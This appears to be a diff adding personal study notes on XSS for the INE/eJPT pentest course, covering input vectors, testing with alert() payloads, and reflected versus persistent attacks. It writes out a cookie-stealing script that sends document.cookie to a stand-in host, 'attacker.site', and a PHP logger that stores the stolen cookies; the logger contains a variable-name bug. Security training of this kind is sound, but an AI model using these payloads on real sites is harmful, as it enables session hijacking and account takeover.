@@ -1,0 +1,79 @@
+INE XSS
+
+Vulnerable Web Applications
+	unfiltered user input to build the output content
+	lets attackers control the output HTML and JavaScript code (allowing for application attacks)
+User input can be the following
+	Request headers
+	cookies
+	form inputs
+	POST parameters
+	GET parameters
+
+Why use XSS
+	make browers load malicious content
+	perform operations on attackers behalf, such as buying products or changing passwords
+	steal session cookies for impersonation
+
+Testing for XSS
+	In a user input field you can try different parameters, such as scripts
+	One easy way to test is to us <i> test
+	if test comes out in italics, then xss can occur
+	after such test make a script
+		<script>alert('This is a test');</script>
+	The url may show the following, and a popup window may appear if XSS is allowed
+www.example.com/search.php?find=<script>alert('This+is+a+test')<%2fscript>
+
+Different Types
+	There are three different types of XSS (eJPT shows reflected and persistent)
+		Reflected
+		Persistent
+		DOM Based
+
+Reflected
+	Happens when a malicious payload is carried inside the request that the browser of the victim sends
+	to a vulnerable website
+
+	Could be triggered by a link, when a user clicks the link the attack is executed
+
+	Example:
+		http://example.com/search.php?find=<payload>
+	Some browsers, such as Chrome, have reflected XSS filters built in
+	Those filters cannot block persistent XSS attacks
+
+Persistent
+	Occurs when a payload is sent to a vulnerable web server and then stored
+	When the web page of the vulnerable website pulls the stored malicious code and puts it in within 
+		the HTLM output, it will deliver XSS payload
+	Malicious code is delivered each time a web browers hits the malicious web page
+
+	The most common vector is HTML forms that submit content to web servers and then display that content
+		back to users
+	Comments, user profiles and forum posts are potential vectors for XSS attacks
+
+XSS To Steal Cookies
+	<script>alert(document.cookie);</script>
+		this will display the cookie session
+Send to attackers website
+	<script>
+	var i = new Image();
+	i.src="http://attacker.site/log.php?q="+document.cookie;
+	</script>
+This will generate an image object and point the src to a script on the attackers server (attacker.site)
+The browers cannot tell if the img is real or not, and loads the img. Nothing actually shows up because there is no image
+a log.php file can be used to save the cookie on the attacker.site
+	<?php
+	$filename="/tmp/log.txt";
+	$fp=fopen($filename, 'a');
+	$cookie=$_GET['q'];
+	fwrite($fp, $cookie);
+	fclose($f0);
+	?>
+
+
+Hack.me is a website to practice XSS
+
+VIDEO IS AWESOME IS ON, WATCHING A FEW TIMES AND DO THE LABS
+	
+	
+
